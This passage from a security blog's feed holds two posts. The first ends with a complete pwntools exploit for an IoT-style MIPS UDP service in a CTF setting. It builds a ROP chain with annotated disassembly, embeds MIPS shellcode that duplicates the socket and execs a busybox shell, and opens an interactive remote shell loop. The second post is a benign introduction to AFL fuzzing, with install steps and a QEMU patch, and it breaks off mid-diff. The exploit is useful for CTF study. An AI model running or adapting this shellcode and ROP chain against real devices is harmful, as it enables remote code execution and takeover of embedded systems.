class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;big&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\033[32m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;192.168.10.108&#x27;</span></span><br><span class="line">port = <span class="number">62720</span></span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">lg(<span class="string">&#x27;[+] open connection&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;FIVI&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x01\x00&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">6</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">p1 += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendto(p1, (ip, port))</span><br><span class="line"></span><br><span class="line">recv_data, recv_addr = r.recvfrom(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getmac</span>(<span class="params">mac_addr</span>):</span><br><span class="line">    hex_str = binascii.hexlify(mac_addr).decode()</span><br><span class="line">    mac_addr = <span class="string">&#x27;:&#x27;</span>.join([hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)])</span><br><span class="line">    li(<span class="string">&#x27;[+] mac = &#x27;</span> + <span class="built_in">str</span>(mac_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(recv_data) == <span class="number">0x21d</span>):</span><br><span class="line">    mac_addr = recv_data[<span class="number">0x11</span>:<span class="number">0x17</span>]</span><br><span class="line">    getmac(mac_addr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ll(<span class="string">&quot;[-] recv error&quot;</span>)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b&#x27;FIVI&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\x02\x00&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">p2 += mac_addr</span><br><span class="line">p2 += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">p2 += <span class="string">b&#x27;\x8E&#x27;</span></span><br><span class="line">p2 = p2.ljust(<span class="number">0x5d</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">588</span></span><br><span class="line">p3 += p32(<span class="number">0x004020A4</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:004020A4 8F BC 00 18                   lw      $gp, 0x7C+var_64($sp)</span></span><br><span class="line"><span class="string">.text:004020A8 8F 99 80 38                   la      $t9, close</span></span><br><span class="line"><span class="string">.text:004020AC 03 20 F8 09                   jalr    $t9 ; close</span></span><br><span class="line"><span class="string">.text:004020B0 02 00 20 21                   move    $a0, $s0                         # fd</span></span><br><span class="line"><span class="string">.text:004020B0</span></span><br><span class="line"><span class="string">.text:004020B4</span></span><br><span class="line"><span class="string">.text:004020B4                               loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j</span></span><br><span class="line"><span class="string">.text:004020B4                                                                        # sub_401DF4+238↑j</span></span><br><span class="line"><span class="string">.text:004020B4                                                                        # sub_401DF4+284↑j</span></span><br><span class="line"><span class="string">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span></span><br><span class="line"><span class="string">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span></span><br><span class="line"><span class="string">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span></span><br><span class="line"><span class="string">.text:004020C0 03 E0 00 08                   jr      $ra</span></span><br><span class="line"><span class="string">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">p3 += p32(<span class="number">0x41B030</span>) <span class="comment"># gp</span></span><br><span class="line">p3 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">p3 += p32(<span class="number">0x00401F98</span>)   <span class="comment"># ra</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00401F98 0C 10 04 F4                   jal     my_puts</span></span><br><span class="line"><span class="string">.text:00401F9C 24 84 2C F8                   li      $a0, aCanTGetHelloSo             # &quot;Can&#x27;t get hello socket\n&quot;</span></span><br><span class="line"><span class="string">.text:00401F9C</span></span><br><span class="line"><span class="string">.text:00401FA0 10 00 00 44                   b       loc_4020B4</span></span><br><span class="line"><span class="string">.text:00401FA4 00 00 00 00                   nop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">my_puts</span></span><br><span class="line"><span class="string">.text:004013D0 addiu   $sp, -0x10</span></span><br><span class="line"><span class="string">.text:004013D4 sw      $a1, 0x10+arg_4($sp)</span></span><br><span class="line"><span class="string">.text:004013D8 sw      $a2, 0x10+arg_8($sp)</span></span><br><span class="line"><span class="string">.text:004013DC sw      $a3, 0x10+arg_C($sp)</span></span><br><span class="line"><span class="string">.text:004013E0 addiu   $v0, $sp, 0x10+arg_4</span></span><br><span class="line"><span class="string">.text:004013E4 sw      $v0, 0x10+var_8($sp)</span></span><br><span class="line"><span class="string">.text:004013E8 addiu   $sp, 0x10</span></span><br><span class="line"><span class="string">.text:004013EC jr      $ra</span></span><br><span class="line"><span class="string">.text:004013F0 nop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">loc_4020B4</span></span><br><span class="line"><span class="string">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span></span><br><span class="line"><span class="string">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span></span><br><span class="line"><span class="string">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span></span><br><span class="line"><span class="string">.text:004020C0 03 E0 00 08                   jr      $ra</span></span><br><span class="line"><span class="string">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">p3 += <span class="string">b&#x27;\x10\x00\x00\x30&#x27;</span> <span class="comment"># b 0xC4</span></span><br><span class="line">p3 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">p3 += p32(<span class="number">0x00413200</span> - <span class="number">0xd</span>) <span class="comment"># s0</span></span><br><span class="line">p3 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">4</span> <span class="comment"># s1</span></span><br><span class="line">p3 += p32(<span class="number">0x00400C9C</span>)     <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p32(<span class="number">0x41B030</span>) <span class="comment"># gp</span></span><br><span class="line">p3 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span></span><br><span class="line">p3 += p32(<span class="number">0x00400F28</span>) <span class="comment"># ra</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00400F28 AE 02 00 0D                   sw      $v0, 0xD($s0)</span></span><br><span class="line"><span class="string">.text:00400F28</span></span><br><span class="line"><span class="string">.text:00400F2C</span></span><br><span class="line"><span class="string">.text:00400F2C                               loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j</span></span><br><span class="line"><span class="string">.text:00400F2C 8F 82 80 68                   la      $v0, ifname</span></span><br><span class="line"><span class="string">.text:00400F30 8C 44 00 00                   lw      $a0, (ifname - 0x413138)($v0)</span></span><br><span class="line"><span class="string">.text:00400F34 8F 99 80 8C                   la      $t9, net_get_hwaddr</span></span><br><span class="line"><span class="string">.text:00400F38 03 20 F8 09                   jalr    $t9 ; net_get_hwaddr</span></span><br><span class="line"><span class="string">.text:00400F3C 26 05 00 11                   addiu   $a1, $s0, 0x11</span></span><br><span class="line"><span class="string">.text:00400F3C</span></span><br><span class="line"><span class="string">.text:00400F40 8F BF 00 24                   lw      $ra, 0x20+var_s4($sp)</span></span><br><span class="line"><span class="string">.text:00400F44 8F B0 00 20                   lw      $s0, 0x20+var_s0($sp)</span></span><br><span class="line"><span class="string">.text:00400F48 03 E0 00 08                   jr      $ra</span></span><br><span class="line"><span class="string">.text:00400F4C 27 BD 00 28                   addiu   $sp, 0x28</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">p3 += p32(<span class="number">0x00413200</span>)     <span class="comment"># s0</span></span><br><span class="line">p3 += p32(<span class="number">0x004027C8</span>)     <span class="comment"># ra</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:004027C0                               loc_4027C0:                              # CODE XREF: sub_402790+3C↓j</span></span><br><span class="line"><span class="string">.text:004027C0 03 20 F8 09                   jalr    $t9</span></span><br><span class="line"><span class="string">.text:004027C4 00 00 00 00                   nop</span></span><br><span class="line"><span class="string">.text:004027C4</span></span><br><span class="line"><span class="string">.text:004027C8</span></span><br><span class="line"><span class="string">.text:004027C8                               loc_4027C8:                              # CODE XREF: sub_402790+28↑j</span></span><br><span class="line"><span class="string">.text:004027C8 8E 19 00 00                   lw      $t9, 0($s0)</span></span><br><span class="line"><span class="string">.text:004027CC 17 31 FF FC                   bne     $t9, $s1, loc_4027C0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x3C\x1C\x00\x42&quot;</span>        <span class="comment"># lui   $gp, 0x42</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x27\x9C\xB0\x30&quot;</span>        <span class="comment"># addiu $gp, $gp, -0x4fd0</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x8F\x82\x80\xB8&quot;</span>        <span class="comment"># la      $v0, server_sockfd</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x8C\x44\x00\x00&quot;</span>        <span class="comment"># lw      $a0, (server_sockfd - 0x413134)($v0)  # fd</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x8F\x85\x80\xF4&quot;</span>        <span class="comment"># lw $a1, -0x7f0c($gp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x24\x0c\xff\xef&quot;</span>        <span class="comment"># li      t4,-17 ( addrlen = 16 )</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x01\x80\x30\x27&quot;</span>        <span class="comment"># nor     a2,t4,zero</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x24\x02\x10\x4a&quot;</span>        <span class="comment"># li      v0,4170 ( sys_connect )</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>        <span class="comment"># syscall 0x40404</span></span><br><span class="line"></span><br><span class="line">shellcode+= <span class="string">b&quot;\x3C\x1C\x00\x42&quot;</span>        <span class="comment"># lui   $gp, 0x42</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x27\x9C\xB0\x30&quot;</span>        <span class="comment"># addiu $gp, $gp, -0x4fd0</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x8F\x82\x80\xB8&quot;</span>        <span class="comment"># la      $v0, server_sockfd</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x8C\x44\x00\x00&quot;</span>        <span class="comment"># lw      $a0, (server_sockfd - 0x413134)($v0)  # fd</span></span><br><span class="line"></span><br><span class="line">shellcode+= <span class="string">b&quot;\x24\x0f\xff\xfd&quot;</span>        <span class="comment"># li      t7,-3</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x01\xe0\x28\x27&quot;</span>        <span class="comment"># nor     a1,t7,zero</span></span><br><span class="line"><span class="comment">#shellcode+= b&quot;\x8f\xa4\xff\xff&quot;        # lw      a0,-1(sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x24\x02\x0f\xdf&quot;</span>        <span class="comment"># li      v0,4063 ( sys_dup2 )</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>        <span class="comment"># syscall 0x40404</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x20\xa5\xff\xff&quot;</span>        <span class="comment"># addi    a1,a1,-1</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x24\x01\xff\xff&quot;</span>        <span class="comment"># li      at,-1</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x14\xa1\xff\xfb&quot;</span>        <span class="comment"># bne     a1,at, dup2_loop</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve /bin/busybox sh</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x28\x06\xFF\xFF&quot;</span>        <span class="comment"># slti    $a2, $zero, -1</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x3C\x0F\x2F\x62&quot;</span>        <span class="comment"># lui     $t7, 0x2f62</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x35\xEF\x69\x6E&quot;</span>        <span class="comment"># ori     $t7, $t7, 0x696e</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\xAF\xAF\xFF\xDC&quot;</span>        <span class="comment"># sw      $t7, -0x24($sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x3C\x0F\x2F\x62&quot;</span>        <span class="comment"># lui     $t7, 0x2f62</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x35\xEF\x75\x73&quot;</span>        <span class="comment"># ori     $t7, $t7, 0x7573</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\xAF\xAF\xFF\xE0&quot;</span>        <span class="comment"># sw      $t7, -0x20($sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x3C\x0F\x79\x62&quot;</span>        <span class="comment"># lui     $t7, 0x7962</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x35\xEF\x6F\x78&quot;</span>        <span class="comment"># ori     $t7, $t7, 0x6f78</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\xAF\xAF\xFF\xE4&quot;</span>        <span class="comment"># sw      $t7, -0x1c($sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\xAF\xA0\xFF\xE8&quot;</span>        <span class="comment"># sw      $zero, -0x18($sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x3C\x0F\x73\x68&quot;</span>        <span class="comment"># lui     $t7, 0x7368</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\xAF\xAF\xFF\xEC&quot;</span>        <span class="comment"># sw      $t7, -0x14($sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\xAF\xA0\xFF\xF0&quot;</span>        <span class="comment"># sw      $zero, -0x10($sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x27\xAF\xFF\xDC&quot;</span>        <span class="comment"># addiu   $t7, $sp, -0x24</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\xAF\xAF\xFF\xF4&quot;</span>        <span class="comment"># sw      $t7, -0xc($sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x27\xAF\xFF\xEC&quot;</span>        <span class="comment"># addiu   $t7, $sp, -0x14</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\xAF\xAF\xFF\xF8&quot;</span>        <span class="comment"># sw      $t7, -8($sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\xAF\xA0\xFF\xFC&quot;</span>        <span class="comment"># sw      $zero, -4($sp)</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x27\xA4\xFF\xDC&quot;</span>        <span class="comment"># addiu   $a0, $sp, -0x24</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x27\xA5\xFF\xF8&quot;</span>        <span class="comment"># addiu   $a1, $sp, -8</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x24\x02\x0F\xAB&quot;</span>        <span class="comment"># addiu   $v0, $zero, 0xfab</span></span><br><span class="line">shellcode+= <span class="string">b&quot;\x01\x01\x01\x0C&quot;</span>        <span class="comment"># syscall 0x40404</span></span><br><span class="line"></span><br><span class="line">p3 += shellcode</span><br><span class="line"></span><br><span class="line">p2 += base64.b64encode(p3)</span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendto(p2, (ip, port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;shell # &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;exit&quot;</span> <span class="keyword">in</span> command:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    command += <span class="string">&quot;\n&quot;</span></span><br><span class="line">    r.sendto(command.encode(), (ip, port))</span><br><span class="line">    recv_data, recv_addr = r.recvfrom(<span class="number">4096</span>)</span><br><span class="line">    li(recv_data.decode())</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">iot漏洞也复现了一些了,看一下在ctf中是怎样的</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="iot" scheme="https://ixout.github.io/tags/iot/"/>
    
    <category term="iotpwn" scheme="https://ixout.github.io/tags/iotpwn/"/>
    
  </entry>
  
  <entry>
    <title>初探AFL-Fuzz</title>
    <link href="https://ixout.github.io/posts/60418/"/>
    <id>https://ixout.github.io/posts/60418/</id>
    <published>2024-05-08T11:40:31.000Z</published>
    <updated>2024-05-16T15:14:46.043Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/system/191543.html">AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/articles/system/197678.html">AFL漏洞挖掘技术漫谈（二）：Fuzz结果分析和代码覆盖率 - FreeBuf网络安全行业门户</a></p><p><a href="https://github.com/google/AFL">google/AFL: american fuzzy lop - a security-oriented fuzzer (github.com)</a></p><p><a href="https://www.secpulse.com/archives/71903.html">fuzz实战之afl - SecPulse.COM | 安全脉搏</a></p><p><a href="https://xz.aliyun.com/t/10315?time__1311=mq%2BxBDyDuGBDRDBqDTmGYG8Dn00Xoqqx&amp;alichlgref=https%3A%2F%2Fgithub.com%2Fliyansong2018%2Ffuzzing-tutorial%2Ftree%2Fmain">AFL二三事——源码分析（上篇） - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/10316?time__1311=mq%2BxBDyDuGBAD%2FD0DoY4AKD%3DjdiK4dx&amp;alichlgref=https%3A%2F%2Fgithub.com%2Fliyansong2018%2Ffuzzing-tutorial%2Ftree%2Fmain">AFL二三事——源码分析（下篇） - 先知社区 (aliyun.com)</a></p><p><a href="https://mundi-xu.github.io/2021/03/12/Start-Fuzzing-and-crashes-analysis/#开始fuzzing">AFL++学习日志（一）开始Fuzz与crashes分析 - Hanyin’s Space (mundi-xu.github.io)</a></p><p><a href="https://zhuanlan.zhihu.com/p/524552737">我的AFL入门之路 - 知乎 (zhihu.com)</a></p><h1 id="什么是Fuzz"><a href="#什么是Fuzz" class="headerlink" title="什么是Fuzz"></a>什么是Fuzz</h1><p>“Fuzz” 即模糊测试，通常用于描述在计算机编程和软件测试中的一种技术或方法。Fuzzing 是一种自动化的软件测试技术，Fuzzing 的基本原理是通过输入大量的随机或半随机数据来测试程序，观察程序如何处理这些数据。通过观察程序对不同输入的反应，可以发现潜在的漏洞和错误。</p><p>可以先看一下(<a href="https://pan.baidu.com/s/1UdLaijUA9AH7GpHcRKhDGQ?pwd=ccc6">https://pan.baidu.com/s/1UdLaijUA9AH7GpHcRKhDGQ?pwd=ccc6</a>)</p><p>这篇论文对fuzz做了一个详细的介绍,从定义与分类到算法与实现,读完以后应该就对fuzz有一个基础的认识了</p><p>并且指出一个完整的fuzzer应该包含以下几个部分</p><ol><li>Preprocess</li><li>Schduling</li><li>Input Generation</li><li>Input Evaluation</li><li>Configuration Updating</li></ol><p>现在已经有十分多的成熟Fuzz技术,例如AFLFuzz,libfuzzer,boofuzz等等等等</p><h2 id="AFLFuzz"><a href="#AFLFuzz" class="headerlink" title="AFLFuzz"></a>AFLFuzz</h2><p>这里以较为经典的AFLFuzz为例进行讲解</p><p><a href="https://github.com/google/AFL">american fuzzy lop</a>(AFL)是由安全研究员Michał Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。其工作流程大致如下：</p><p>①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</p><p>②选择一些输入文件，作为初始测试集加入输入队列（queue）；</p><p>③将队列中的文件按一定的策略进行“突变”；</p><p>④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;</p><p>⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-12_102523.png" alt=""></p><p>AFL既可以对源码进行编译时插桩，也可以使用AFL的<code>QEMU mode</code>对二进制文件进行插桩，但是前者的效率相对来说要高很多，在Github上很容易就能找到很多合适的项目。</p><p>AFL主要用于C/C++程序的测试，所以这是我们寻找软件的最优先规则。</p><h2 id="AFL变异策略"><a href="#AFL变异策略" class="headerlink" title="AFL变异策略"></a><strong>AFL变异策略</strong></h2><ul><li><p>确定性变异</p><ul><li>比特翻转（bitflip）：按位翻转，1变为0，0变为1.这一阶段还会按照不同的长度和步长进行多种不同的翻转，每次翻转1/2/4/8/16/32 bit，依次进行。</li><li>算术运算(arithmetic)：整数加/减算术运算。跟bitflip类似，arithmetic根据目标大小的不同，也分为了多个子阶段，依次对8/16/32 bit进行加减运算。</li><li>特殊值替换（interest）：把一些特殊内容替换到原文件中。同样每次对8/16/32 bit进行替换。所谓的特殊内容是AFL预设的一些比较特殊的数，比如可能造成溢出的数。</li><li>字典值（dictionary）：把自动生成或用户提供的字典值替换或插入到原测试用例中。</li></ul></li><li><p>随机变异</p><ul><li>havoc大破坏：对文件进行大量破坏，此阶段会对原文件进行大量随机变异。包括随机翻转、加减、替换和删除等操作。</li><li>文件拼接splice：此阶段会将两个文件拼接起来得到一个新的文件，并对这个新文件继续执行havoc变异。</li></ul></li></ul><h1 id="如何使用AFL"><a href="#如何使用AFL" class="headerlink" title="如何使用AFL"></a>如何使用AFL</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="白盒模式"><a href="#白盒模式" class="headerlink" title="白盒模式"></a>白盒模式</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/AFL.git</span><br><span class="line">make &amp;&amp;sudo make install</span><br></pre></td></tr></table></figure><h3 id="黑盒模式"><a href="#黑盒模式" class="headerlink" title="黑盒模式"></a>黑盒模式</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu-mode</span><br></pre></td></tr></table></figure><p>修改<code>build_qemu_support.sh</code>两处</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QEMU_URL=<span class="string">&quot;https://download.qemu.org/qemu-<span class="variable">$&#123;VERSION&#125;</span>.tar.xz&quot;</span></span><br><span class="line">...</span><br><span class="line">CFLAGS=<span class="string">&quot;-O3 -ggdb&quot;</span> ./configure --disable-system \</span><br><span class="line">  --enable-linux-user --disable-gtk --disable-sdl --disable-vnc --python=/usr/bin/python2.7 \</span><br><span class="line">  --target-list=<span class="string">&quot;<span class="variable">$&#123;CPU_TARGET&#125;</span>-linux-user&quot;</span> --enable-pie --enable-kvm || <span class="built_in">exit</span> 1</span><br></pre></td></tr></table></figure><p>修改./patchs/syscall.diff为</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-clean/linux-user/syscall.c2020-03-12 18:47:47.898592169 +0100</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0/linux-user/syscall.c2020-03-12 19:16:41.563074307 +0100</span></span><br><span class="line"><span class="meta">@@ -34,6 +34,7 @@</span></span><br><span class="line"> #include &lt;sys/resource.h&gt;</span><br><span class="line"> #include &lt;sys/swap.h&gt;</span><br><span class="line"> #include &lt;linux/capability.h&gt;</span><br><span class="line"><span class="addition">+#include &lt;linux/sockios.h&gt; // 